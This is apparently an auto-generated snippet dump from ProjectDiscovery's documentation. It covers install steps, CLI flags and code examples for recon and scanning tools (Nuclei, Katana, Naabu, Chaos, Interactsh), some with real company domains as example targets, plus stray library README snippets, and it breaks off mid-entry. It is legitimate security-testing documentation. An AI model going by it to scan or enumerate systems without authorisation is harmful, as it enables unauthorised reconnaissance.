yaml\nCODE:\n```\nopenapi: get /v1/scans/vuln/{vuln_id}\n```\n\n----------------------------------------\n\nTITLE: Running Development Server\nDESCRIPTION: Command to start the Mintlify development server locally.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nmintlify dev\n```\n\n----------------------------------------\n\nTITLE: Configuring Static File Hosting in Interactsh\nDESCRIPTION: Command to start Interactsh server with static file hosting enabled using -http-directory flag to serve files under /s/ directory.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_5\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-server -d hackwithautomation.com -http-directory ./paylods\n```\n\n----------------------------------------\n\nTITLE: Configuring Kubernetes Provider in YAML\nDESCRIPTION: Example configuration block for integrating Kubernetes with Cloudlist. Allows specifying Kubernetes connection details through a file path or encoded kubeconfig content.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: kubernetes\n  id: staging\n  kubeconfig: path/to/kubeconfig\n  context: <context-name>\n```\n\n----------------------------------------\n\nTITLE: Defining SSH KexInitMsg Interface Properties in TypeScript\nDESCRIPTION: TypeScript interface definition specifying the properties of an SSH key exchange initialization message. Includes arrays for supported algorithms, compression methods, and various connection parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.KexInitMsg.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface KexInitMsg {\n  ServerHostKeyAlgos?: string[];\n  CiphersClientServer?: string[];\n  CiphersServerClient?: string[];\n  CompressionServerClient?: string[];\n  CompressionClientServer?: string[];\n  LanguagesServerClient?: string[];\n  LanguagesClientServer?: string[];\n  Reserved?: number;\n  FirstKexFollows?: boolean;\n  Cookie?: Uint8Array; // fixed size array of length: [16]\n  KexAlgos?: string[];\n  MACsClientServer?: string[];\n  MACsServerClient?: string[];\n}\n```\n\n----------------------------------------\n\nTITLE: Running Mintlify Development Server for ProjectDiscovery Documentation\nDESCRIPTION: This command starts the Mintlify development server, allowing local preview and editing of the ProjectDiscovery documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nmintlify dev\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for Vulnerability Ticket in OpenAPI\nDESCRIPTION: This OpenAPI snippet specifies a DELETE endpoint for removing a vulnerability ticket. It includes the path parameter for the vulnerability ID and outlines potential response codes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-vulns-tracker-association.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/scans/vulns/{vuln_id}/ticket\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Scan Import Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a POST endpoint at /v1/scans/import. The endpoint is used for importing scan data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/import-oss-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/import\n```\n\n----------------------------------------\n\nTITLE: Initializing RDP Client in Nuclei\nDESCRIPTION: Basic initialization of the RDPClient class using the nuclei/rdp module. Creates a new instance of the RDP client.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.RDPClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst client = new rdp.Client();\n```\n\n----------------------------------------\n\nTITLE: Architecture Detection Functions in JavaScript\nDESCRIPTION: Functions for detecting the current system architecture. Includes checks for 386, Amd64, ARM, ARM64, and WebAssembly architectures.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nArch() string\nIs386() bool\nIsAmd64() bool\nIsARM() bool\nIsARM64() bool\nIsWasm() bool\n```\n\n----------------------------------------\n\nTITLE: Setting Rate Limit in Nuclei CLI\nDESCRIPTION: Configures the global rate limit for HTTP requests in Nuclei, affecting speed and memory usage.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n-rl <number> or -rate-limit <number>\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET User Endpoint in YAML\nDESCRIPTION: A simple OpenAPI endpoint definition that specifies a GET request to /v1/user. This would typically be part of a larger OpenAPI specification document that defines the API's structure and operations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/get-user-profile.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user\n```\n\n----------------------------------------\n\nTITLE: Running Interactsh Server with Custom Domain\nDESCRIPTION: Command to start interactsh-server with a specified domain\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ninteractsh-server -domain INTERACTSH_DOMAIN\n```\n\n----------------------------------------\n\nTITLE: Installing dnsx using Homebrew\nDESCRIPTION: This command installs dnsx using Homebrew package manager. It is supported on macOS and Linux systems.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbrew install dnsx\n```\n\n----------------------------------------\n\nTITLE: Starting FTP Protocol Support in Interactsh\nDESCRIPTION: Example of starting Interactsh server with FTP protocol support in debug mode.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ sudo go run . -ftp -skip-acme -debug -domain localhost\n```\n\n----------------------------------------\n\nTITLE: Extracting Data in Nuclei Headless Protocol\nDESCRIPTION: This snippet shows how to use the 'extract' action to retrieve text or attribute values from specific elements on the page using XPath selectors.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\naction: extract\nname: extracted-value\nargs: \n  by: xpath\n  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Path Definition\nDESCRIPTION: Defines the API endpoint path for retrieving error logs for a specific scan using the scan_id parameter\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/elog/get-elogs-of-given-scan-id.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/{scan_id}/error_log\n```\n\n----------------------------------------\n\nTITLE: Installing Development Dependencies\nDESCRIPTION: Command to install the Mintlify documentation framework globally using npm.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm i -g mintlify@latest\n```\n\n----------------------------------------\n\nTITLE: Running Katana in Headless Mode without Incognito\nDESCRIPTION: Shows how to run Katana in headless mode without incognito, useful when using the local browser.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -headless -no-incognito\n```\n\n----------------------------------------\n\nTITLE: Downloading Katana Binary\nDESCRIPTION: This URL provides access to the latest binary releases of Katana for different operating systems. Users need to download and unzip the appropriate file for their OS.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/install.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/katana/releases\n```\n\n----------------------------------------\n\nTITLE: Pulling Subfinder Docker Image\nDESCRIPTION: This command pulls the latest tagged Subfinder Docker image from the ProjectDiscovery repository. It's useful for running Subfinder in containerized environments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/subfinder:latest\n```\n\n----------------------------------------\n\nTITLE: Defining HandshakeLog Interface for SSH in TypeScript\nDESCRIPTION: This code snippet defines the HandshakeLog interface with various optional properties related to SSH handshake information. It includes references to other interfaces like Algorithms, EndpointId, and KexInitMsg.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.HandshakeLog.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface HandshakeLog {\n  AlgorithmSelection?: Algorithms;\n  Banner?: string;\n  ClientID?: EndpointId;\n  ClientKex?: KexInitMsg;\n  ServerID?: EndpointId;\n  ServerKex?: KexInitMsg;\n  UserAuth?: string[];\n}\n```\n\n----------------------------------------\n\nTITLE: Using CSSType for Basic Property Typing\nDESCRIPTION: Example of using CSSType to type-check basic CSS properties. It demonstrates correct usage of width and margin properties.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\nconst style: CSS.Properties = {\n  width: '10px',\n  margin: '1em',\n};\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for Asset Enumeration Filters Endpoint\nDESCRIPTION: This YAML snippet specifies the OpenAPI definition for the GET /v1/asset/enumerate/filters endpoint. It includes the endpoint path and HTTP method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/group-assets-by-filters.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/enumerate/filters\n```\n\n----------------------------------------\n\nTITLE: JavaScript Protocol-Specific Functions\nDESCRIPTION: Functions specific to the JavaScript protocol. 'set' sets a variable from init code, and 'updatePayload' updates or overrides any payload from init code. Both functions are only available in the init code block.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nset(string, interface{})\nupdatePayload(string, interface{})\n```\n\n----------------------------------------\n\nTITLE: Configuring Response Size Read Limit in Nuclei CLI\nDESCRIPTION: Sets the maximum response size that Nuclei should read to avoid excessive memory usage.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n-rsr <size> or -response-size-read <size>\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for PATCH /v1/user/team/member Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for patching a team member's details. It specifies the endpoint path and HTTP method for the operation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/update-team-member.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/user/team/member\n```\n\n----------------------------------------\n\nTITLE: URL Filtering with Regex in Katana\nDESCRIPTION: Demonstrates using regex patterns to exclude specific URLs from crawler output using the -fr flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_26\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://tesla.com -fr 'https://www\\.tesla\\.com/*' -silent\n```\n\n----------------------------------------\n\nTITLE: Connecting to MySQL Database in JavaScript\nDESCRIPTION: Establishes a connection to a MySQL database using the provided host, port, username, and password. Returns a boolean indicating success or failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst client = new mysql.MySQLClient;\nconst connected = client.Connect('acme.com', 3306, 'username', 'password');\n```\n\n----------------------------------------\n\nTITLE: Pattern Examples in Console\nDESCRIPTION: Example patterns for generating subdomain permutations using variables and words.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n\"{{sub}}-{{word}}.{{suffix}}\" // ex: api-prod.scanme.sh\n\"{{word}}-{{sub}}.{{suffix}}\" // ex: prod-api.scanme.sh\n\"{{word}}.{{sub}}.{{suffix}}\" // ex: prod.api.scanme.sh\n\"{{sub}}.{{word}}.{{suffix}}\" // ex: api.prod.scanme.sh\n```\n\n----------------------------------------\n\nTITLE: Nuclei Command with Missing Auth Parameter\nDESCRIPTION: This snippet shows the Nuclei command output when there's a missing authentication parameter (X-API-Key) in the OpenAPI schema. It demonstrates how Nuclei handles missing required parameters.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/input-formats.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n./nuclei -l rest-openapi.yaml -im openapi\n\n                           __     _\n         ____  __  _______/ /__  (_)\n        / __ \\/ / / / ___/ / _ \\/ /\n       / / / / /_/ / /__/ /  __/ /\n      /_/ /_/\\__,_/\\___/_/\\___/_/   v3.2.0\n\n            projectdiscovery.io\n\n    [FTL] openapi: missing global auth parameter: X-API-Key\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Redirects in Nuclei Template\nDESCRIPTION: Demonstrates how to handle HTTP redirects in a Nuclei template, including enabling redirect following and setting maximum redirect limits.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/login.php\"\n    redirects: true\n    max-redirects: 3\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Enumeration Scheduling Endpoint\nDESCRIPTION: YAML OpenAPI specification defining the POST /v1/enumeration/schedule endpoint, which allows scheduling of enumeration tasks in the projectdiscovery API.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/set-enumeration-schedule.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/enumeration/schedule\n```\n\n----------------------------------------\n\nTITLE: Rendering Community Resource Cards in JSX\nDESCRIPTION: This code snippet creates a card group with four cards, each representing a different community resource for ProjectDiscovery. It uses JSX syntax to structure the layout and provide links to Discord, GitHub Discussions, Community page, and GitHub Issues.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/_snippets/help-cards.mdx#2025-04-12_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<CardGroup cols={2}>\n  <Card \n    title=\"Discord\" \n    icon=\"discord\"\n    iconType=\"solid\"\n    href=\"https://discord.gg/projectdiscovery\"\n  >\n    Join our Discord server and over 6k other security professionals to learn together!\n  </Card>\n  <Card \n    title=\"GitHub Discussions\" \n    icon=\"github\"\n    iconType=\"solid\"\n    href=\"https://github.com/projectdiscovery/nuclei/discussions\"\n  >\n    Questions about using Nuclei or our tools? See GitHub Discussions for guidance.\n  </Card>\n  <Card \n    title=\"Community\" \n    icon=\"people-group\"\n    href=\"https://projectdiscovery.io/community\"\n  >\n    Democratize security together! Find out more about our community here.\n  </Card>\n  <Card \n    title=\"GitHub Issues\" \n    icon=\"github\"\n    iconType=\"solid\"\n    href=\"https://github.com/projectdiscovery/nuclei/issues\"\n  >\n    Found a bug or have an idea for a new feature? Open an issue now!\n  </Card>\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Using Naabu as a Go Library\nDESCRIPTION: This Go code demonstrates how to use Naabu as a library to scan port 80 on scanme.sh. The results are returned via a callback function.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_8\n\nLANGUAGE: go\nCODE:\n```\npackage main\n\nimport (\n\t\"log\"\n\n\t\"github.com/projectdiscovery/goflags\"\n\t\"github.com/projectdiscovery/naabu/v2/pkg/result\"\n\t\"github.com/projectdiscovery/naabu/v2/pkg/runner\"\n)\n\nfunc main() {\n\toptions := runner.Options{\n\t\tHost:      goflags.StringSlice{\"scanme.sh\"},\n\t\tScanType: \"s\",\n\t\tOnResult: func(hr *result.HostResult) {\n\t\t\tlog.Println(hr.Host, hr.Ports)\n\t\t},\n\t\tPorts: \"80\",\n\t}\n\n\tnaabuRunner, err := runner.NewRunner(&options)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer naabuRunner.Close()\n\n\tnaabuRunner.RunEnumeration()\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Naabu Binary\nDESCRIPTION: URL to download pre-compiled binary releases of Naabu.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/naabu/releases/\n```\n\n----------------------------------------\n\nTITLE: Installing Google Chrome and Dependencies on Ubuntu without Snap\nDESCRIPTION: This set of commands installs Google Chrome and necessary dependencies on Ubuntu without using Snap. It includes updating the system, installing required tools, adding Google's repository, and finally installing Chrome.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/faq.mdx#2025-04-12_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo apt update\nsudo snap refresh\nsudo apt install zip curl wget git\nsudo snap install golang --classic\nwget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add - \nsudo sh -c 'echo \"deb http://dl.google.com/linux/chrome/deb/ stable main\" >> /etc/apt/sources.list.d/google.list'\nsudo apt update \nsudo apt install google-chrome-stable\n```\n\n----------------------------------------\n\nTITLE: Retrieving SSH Server Information in JavaScript\nDESCRIPTION: Connects to an SSH server in info mode and returns a HandshakeLog object with server information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nconst info = client.ConnectSSHInfoMode('acme.com', 22);\nlog(to_json(info));\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with Generic Length and Time Parameters\nDESCRIPTION: Examples of using CSSType with generic parameters for length and time. It shows how to specify custom types for length and time values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\nconst style: CSS.Properties<string | number> = {\n  width: 100,\n};\n\nconst style: CSS.Properties<string | number, number> = {\n  transitionDuration: 1000,\n};\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Definition for GET Asset Contents Endpoint\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves contents of a specific asset by its ID. The endpoint follows the pattern /v1/assets/{asset_id}/contents.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/get-asset-content.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/assets/{asset_id}/contents\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei from Binary\nDESCRIPTION: This provides the URL to download pre-built binaries for different operating systems. Users need to download the appropriate binary for their OS and unzip it.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/nuclei/releases\n```\n\n----------------------------------------\n\nTITLE: Writing Chaos Output to File\nDESCRIPTION: Demonstrates how to save the output of Chaos to a file using the -o flag, which is optional.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com -o uber.txt\n```\n\n----------------------------------------\n\nTITLE: Setting Max Host Error in Nuclei CLI\nDESCRIPTION: Configures the maximum number of network errors allowed per host before removing it from the scan.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n-mhe <number> or -max-host-error <number>\n```\n\n----------------------------------------\n\nTITLE: Instantiating GoConsolePrinter in TypeScript\nDESCRIPTION: Constructor for creating a new instance of the GoConsolePrinter class. This class provides methods for console output in a Go-inspired logging system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/goconsole.GoConsolePrinter.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\nnew GoConsolePrinter()\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with Fallback Values\nDESCRIPTION: Example of using CSSType to allow fallback values as arrays. It demonstrates how to use PropertiesFallback for vendor prefixing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_5\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\nconst style: CSS.PropertiesFallback = {\n  display: ['-webkit-flex', 'flex'],\n  color: 'white',\n};\n```\n\n----------------------------------------\n\nTITLE: Converting SMTPMessage to String in JavaScript\nDESCRIPTION: Returns the string representation of the SMTPMessage object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\nmessage.To('xyz2@projectdiscoveyr.io');\nmessage.Subject('hello');\nmessage.Body('hello');\nlog(message.String());\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Hex() Method in JavaScript\nDESCRIPTION: Demonstrates the usage of the Hex() method to get the hexadecimal representation of the buffer contents as a string.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\nlog(buffer.Hex());\n```\n\n----------------------------------------\n\nTITLE: Displaying Domain Statistics with Chaos CLI\nDESCRIPTION: Illustrates how to use Chaos to show statistics for a specified domain using the -count flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com -count\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Integration Profile in YAML\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a REST API endpoint that retrieves integration profiles by name. The endpoint uses a path parameter to identify the specific integration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-integration-user-profile.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/integration/{name}/profile\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Route Definition for AI Template Endpoint\nDESCRIPTION: Defines an OpenAPI route specification for POST /v1/template/ai endpoint\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/generate-ai-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/template/ai\n```\n\n----------------------------------------\n\nTITLE: Displaying Interactsh Client Help Options in YAML\nDESCRIPTION: This code snippet shows the full usage guide for the Interactsh client, including all available flags and options. It covers input configuration, filtering, update settings, output options, and debug features.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nUsage:\n  ./interactsh-client [flags]\n\nFlags:\nINPUT:\n   -s, -server string  interactsh server(s) to use (default \"oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me\")\n\nCONFIG:\n   -config string                           flag configuration file (default \"$HOME/.config/interactsh-client/config.yaml\")\n   -n, -number int                          number of interactsh payload to generate (default 1)\n   -t, -token string                        authentication token to connect protected interactsh server\n   -pi, -poll-interval int                  poll interval in seconds to pull interaction data (default 5)\n   -nf, -no-http-fallback                   disable http fallback registration\n   -cidl, -correlation-id-length int        length of the correlation id preamble (default 20)\n   -cidn, -correlation-id-nonce-length int  length of the correlation id nonce (default 13)\n   -sf, -session-file string                store/read from session file\n\nFILTER:\n   -m, -match string[]   match interaction based on the specified pattern\n   -f, -filter string[]  filter interaction based on the specified pattern\n   -dns-only             display only dns interaction in CLI output\n   -http-only            display only http interaction in CLI output\n   -smtp-only            display only smtp interactions in CLI output\n\nUPDATE:\n   -up, -update                 update interactsh-client to latest version\n   -duc, -disable-update-check  disable automatic interactsh-client update check\n   \nOUTPUT:\n   -o string                         output file to write interaction data\n   -json                             write output in JSONL(ines) format\n   -ps, -payload-store               enable storing generated interactsh payload to file\n   -psf, -payload-store-file string  store generated interactsh payloads to given file (default \"interactsh_payload.txt\")\n   -v                                display verbose interaction\n\nDEBUG:\n   -version            show version of the project\n   -health-check, -hc  run diagnostic check up\n```\n\n----------------------------------------\n\nTITLE: Installing Notify via Go Install\nDESCRIPTION: Command to install the Notify CLI tool using Go's package manager. Requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/notify/cmd/notify@latest\n```\n\n----------------------------------------\n\nTITLE: Accessing Help in Chaos CLI\nDESCRIPTION: Demonstrates how to display all help options for Chaos using the command-line interface.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nchaos -h\n```\n\n----------------------------------------\n\nTITLE: Using IsRDP Function in JavaScript\nDESCRIPTION: Demonstrates how to use the IsRDP function from the RDP module to check if a target is running RDP. The function returns an IsRDPResponse object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.IsRDPResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rdp = require('nuclei/rdp');\nconst isRDP = rdp.IsRDP('acme.com', 3389);\nlog(toJSON(isRDP));\n```\n\n----------------------------------------\n\nTITLE: Using clsx/lite in JavaScript\nDESCRIPTION: Example of using the lightweight version of clsx that only accepts string arguments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/clsx/readme.md#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { clsx } from 'clsx/lite';\n// or\nimport clsx from 'clsx/lite';\n\n// string\nclsx('hello', true && 'foo', false && 'bar');\n// => \"hello foo\"\n\n// NOTE: Any non-string input(s) ignored\nclsx({ foo: true });\n//=> \"\"\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for Stripe Checkout Session Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /v1/payment/stripe/checkout_session endpoint. It specifies the API path and HTTP method for creating a Stripe checkout session.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/create-subscription-checkout.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/payment/stripe/checkout_session\n```\n\n----------------------------------------\n\nTITLE: Updating Chaos to Latest Version\nDESCRIPTION: Demonstrates how to update Chaos to the latest version using the -update flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\nchaos -up\n```\n\n----------------------------------------\n\nTITLE: Defining ServiceRDP Interface in TypeScript\nDESCRIPTION: This code snippet defines the ServiceRDP interface with optional properties for RDP connections. It includes fields for DNS and NetBIOS names, forest name, OS details, and target information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.ServiceRDP.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface ServiceRDP {\n  DNSComputerName?: string;\n  DNSDomainName?: string;\n  ForestName?: string;\n  NetBIOSComputerName?: string;\n  NetBIOSDomainName?: string;\n  OSFingerprint?: string;\n  OSVersion?: string;\n  TargetName?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Excluding Default Ports in Nuclei Network Template\nDESCRIPTION: Shows how to use the 'exclude-ports' field to customize the list of default reserved ports, allowing for more flexible port targeting.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nexclude-ports: 80,443\n```\n\n----------------------------------------\n\nTITLE: Reading File as Byte Array with Nuclei fs Module\nDESCRIPTION: Reads file contents from permitted paths and returns the content as a byte array (Uint8Array) using the ReadFile function. Returns null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// here permitted directories are $HOME/nuclei-templates/*\nconst content = fs.ReadFile('helpers/usernames.txt');\n```\n\n----------------------------------------\n\nTITLE: Defining SessionSetupLog Interface Properties in TypeScript\nDESCRIPTION: TypeScript interface definition for SessionSetupLog showing all available properties including HeaderLog, NegotiateFlags, SetupFlags, and TargetName. Each property is optional and has specific types.\nSOURCE: 